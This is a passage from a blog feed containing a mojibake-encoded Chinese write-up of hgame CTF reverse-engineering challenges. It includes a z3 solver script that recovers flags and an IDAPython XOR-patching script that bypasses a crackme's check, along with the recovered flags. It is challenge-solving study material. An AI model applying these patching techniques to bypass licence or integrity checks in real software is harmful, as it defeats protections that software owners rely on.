number\">28978</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23120</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22802</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31533</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48576</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">28542</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">43265</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22365</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61108</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2823</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">30343</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token number\">14780</span> <span class=\"token operator\">==</span> <span class=\"token number\">3504803</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22466</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55999</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">53658</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">47160</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12511</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59807</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">46242</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3052</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">25279</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token number\">30202</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33480</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16757</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">11003580</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57492</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13421</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13941</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">48092</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">38310</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9884</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token number\">45500</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">19233</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">58274</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36175</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18568</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">49694</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">9473</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">25546210</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">23355</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">50164</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">34618</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token number\">52703</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36245</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">46648</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4858</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41846</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">27122</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">42058</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15676</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31863</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62510</span> <span class=\"token operator\">==</span> <span class=\"token number\">11333836</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30523</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7990</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39058</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57549</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53440</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4275</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48863</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55436</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">2624</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13652</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62231</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19456</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13195</span> <span class=\"token operator\">==</span> <span class=\"token number\">13863722</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>text<span class=\"token operator\">=</span><span class=\"token number\">47</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>num<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># æ·»åŠ çº¦æŸæ¡ä»¶</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># æ£€æµ‹æ˜¯å¦æœ‰è§£</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> num<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># å› ä¸ºæœ€åå¾—å‡ºçš„æ˜¯ç­‰å¼ï¼Œå…ˆéå† tempï¼ŒæŠŠ temp çš„æ¯ä¸ªä¾æ¬¡èµ‹ç»™ i</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ç„¶åæ‰¾åˆ°æ¯ä¸ª temp å¯¹åº”çš„è§£ï¼Œé™„åŠ åˆ°ç©ºåˆ—è¡¨çš„åé¢</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'æ— è§£'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    text <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>flag<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token triple-quoted-string string\">'''è¾“å‡ºç»“æœ:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>[236, 72, 213, 106, 189, 86, 62, 53, 120, 199, 15, 93, 133]</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;'''</pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åé¢çš„å¼‚æˆ–ä¹‹åæ‰æ˜¯ flag</p>\n<p>æ¯æ¬¡ç”¨ z3 è§£ flag éƒ½è¦ç”¨çº¦æŸæ¡ä»¶ 32-127 æ‰è¡Œä¸ç„¶å°±æ˜¯ä¹±ç  ä¸çŸ¥é“æœ‰æ²¡æœ‰åˆ«çš„è§£å†³åŠæ³•</p>\n<p z3_1s_very_u5eful_1n_rever5e_engin3ering>flag ä¸º hgame</p>\n<h4 id=\"cpp\"><a class=\"markdownIt-Anchor\" href=\"#cpp\">#</a> Cpp</h4>\n<p>cpp è™šå‡½æ•°ç›¸å…³</p>\n<p>hint ç»™äº†ä¸ª pdb æ–‡ä»¶ ç”¨ IDA åŠ è½½ç¬¦å·ä¹‹åçœ‹ main å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230203145356862.png\" alt=\"image.png\"></p>\n<p>å°† v8 çš„ç±»å‹æ”¹æˆ encrypt2*ï¼Œåé¢çš„å‡½æ•°è°ƒç”¨å°±ä¼šéå¸¸æ¸…æ™°ã€‚(ä¸Šå›¾ä¸ºæ”¹åï¼Œæ²¡æƒ³åˆ°è¿™ä¸€æ­¥çš„ä¹Ÿå¯ä»¥åŠ¨æ€è°ƒè¯•ç€åš)</p>\n<p><img data-src=\"/images/image-20230203145629222.png\" alt=\"image.png\"></p>\n<p>func7 æ˜¯åˆ¤æ–­ flag æ­£ç¡®ä¸å¦çš„å‡½æ•° é‚£ä¹ˆ func2 func6 å°±æ˜¯å…³é”®</p>\n<p><img data-src=\"/images/image-20230203145903551.png\" alt=\"image.png\"></p>\n<p>å…ˆåœ¨å‡½æ•°çª—å£æ‰¾åˆ° func7 æå–å‡ºæ¯”è¾ƒæ•°æ®</p>\n<p>[0x28, 0x50, 0xC1, 0x23, 0x98, 0xA1, 0x41, 0x36, 0x4C, 0x31, 0xCB, 0x52, 0x90, 0xF1, 0xAC, 0xCC, 0x0F, 0x6C, 0x2A, 0x89, 0x7F, 0xDF, 0x11, 0x84, 0x7F, 0xE6, 0xA2, 0xE0, 0x59, 0xC7, 0xC5, 0x46, 0x5D, 0x29, 0x38, 0x93, 0xED, 0x15, 0x7A, 0xFF]</p>\n<p><img data-src=\"/images/image-20230203151215551.png\" alt=\"image.png\"></p>\n<p>func2 åƒæ˜¯æŸç§åˆå§‹åŒ–ï¼Œä¸€ç³»åˆ—èµ‹å€¼</p>\n<p>func6 å°±æ˜¯å¼‚æˆ–åŠ å¯†</p>\n<p><img data-src=\"/images/image-20230203185923866.png\" alt=\"image.png\"></p>\n<p>é‡ç‚¹å°±æ˜¯æå–å‡ºå¼‚æˆ–çš„æ•°æ®</p>\n<p><img data-src=\"/images/image-20230203191542378.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œçœ‹çœ‹ string2int å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230203192122620.png\" alt=\"image.png\"></p>\n<p>è¿™çœ‹äº† WP è¿˜æ²¡ææ‡‚â€¦ ç­‰å¤§ä½¬ä»¬çš„åšå®¢ ing</p>\n<h4 id=\"patchme\"><a class=\"markdownIt-Anchor\" href=\"#patchme\">#</a> patchme</h4>\n<p>IDA æ‰“å¼€æ‰¾åˆ° main å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230204013212414.png\" alt=\"image.png\"></p>\n<p>æ ¹æ®é¢˜ç›® åº”è¯¥æ˜¯è¦ patch æŸä¸ªåœ°æ–¹</p>\n<p><img data-src=\"/images/image-20230204013602004.png\" alt=\"image.png\"></p>\n<p>åœ¨ main å‡½æ•°é™„è¿‘æ‰¾åˆ°äº†ä¸€ä¸ªåœ¨ main å‡½æ•°ä¹‹å‰æ‰§è¡Œçš„ä¸€ä¸ªè‡ªè§£å¯†å‡½æ•°</p>\n<p>idapython çš„è„šæœ¬è¿›è¡Œå¼‚æˆ–æ“ä½œ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> idc</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>addr <span class=\"token operator\">=</span> <span class=\"token number\">0x14C6</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">961</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    idc<span class=\"token punctuation\">.</span>patch_byte<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span>i<span class=\"token punctuation\">,</span> idc<span class=\"token punctuation\">.</span>get_wide_byte<span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ç„¶åæ±‡ç¼–ä¿®æ”¹ä¸Šé¢çš„ jnz å˜ jz ä¸‹é¢çš„å˜ jmp ä¿å­˜ patch å†å¼‚æˆ–ä¿å­˜æ–‡ä»¶ å†è¿è¡Œå°±è¡Œäº†</p>\n<p>IDA-ã€‹edit-ã€‹Patch program-ã€‹Assemble ä¿®æ”¹ï¼Œç„¶å IDA-ã€‹edit-ã€‹Patch program-ã€‹Apply patches to input file ä¿å­˜ (å¯é€‰æ‹©å¤‡ä»½ä½†ä¸å¦‚è‡ªå·±å¤‡ä»½)</p>\n<p><img data-src=\"/images/image-20230204124943398.png\" alt=\"image.png\"></p>\n<p>loc_164A å°±æ˜¯è¾“å‡º flag å‡½æ•°</p>\n<p>æ‰§è¡Œç»“æœ:</p>\n<p><img data-src=\"/images/image-20230204130419527.png\" alt=\"image.png\"></p>\n<p you_4re_a_p@tch_master_0r_reverse_ma5ter>flag ä¸º hgame</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "url": "https://3cly.github.io/2023/01/07/CSAPP%E3%81%AE%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2/",
            "title": "CSAPPã®å­¦ç¿’è¨˜éŒ²",
            "date_published": "2023-01-06T16:17:12.000Z",
